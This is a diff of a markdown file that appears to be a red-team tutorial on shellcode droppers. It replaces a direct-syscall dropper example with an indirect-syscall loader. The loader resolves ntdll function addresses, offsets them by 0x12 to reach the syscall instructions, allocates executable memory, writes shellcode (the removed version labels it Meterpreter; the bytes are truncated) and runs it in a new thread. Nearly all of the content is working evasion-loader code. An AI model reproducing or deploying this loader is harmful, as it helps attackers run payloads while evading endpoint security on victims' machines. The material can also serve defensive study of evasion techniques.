@@ -152,34 +152,59 @@ The main code of the direct syscall dropper looks like the following and is alre
 <summary>Code</summary>
     
 ```
-#include <iostream>
-#include <Windows.h>
+#include <windows.h>  
+#include <stdio.h>    
 #include "syscalls.h"
 
+// Declare global variables to hold the syscall instruction addresses
+UINT_PTR sysAddrNtAllocateVirtualMemory;
+UINT_PTR sysAddrNtWriteVirtualMemory;
+UINT_PTR sysAddrNtCreateThreadEx;
+UINT_PTR sysAddrNtWaitForSingleObject;
+
+
 int main() {
-    // Insert Meterpreter shellcode
-    unsigned char code[] = "\xfc\x48\x83...";
+    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
+    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)
 
-    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
-    // 'exec' will hold the base address of the allocated memory region
-    void* exec = NULL;
-    SIZE_T size = sizeof(code);
-    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    // Get a handle to the ntdll.dll library
+    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
 
-    // Copy the shellcode into the allocated memory region
-    SIZE_T bytesWritten;
-    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
+    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
+    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
+    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
 
-    // Execute the shellcode in memory using a new thread
-    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
+
+    // The syscall stub (actual system call instruction) is some bytes further into the function. 
+    // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
+    // So we add 0x12 to the function's address to get the address of the system call instruction.
+    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
+    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
+    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
+    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
+
+
+
+    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
+    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+
+    // Define the shellcode to be injected
+    unsigned char shellcode[] = "\xfc\x48\x83...";
+
+    ULONG bytesWritten;
+    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
+    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);
+
     HANDLE hThread;
-    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
+    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
 
-    // Wait for the end of the thread to ensure the shellcode execution is complete
+    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
     NtWaitForSingleObject(hThread, FALSE, NULL);
 
-
-    // Return 0 as the main function exit code
+    // Return 0 to indicate successful execution of the program.
     return 0;
 }
 ```
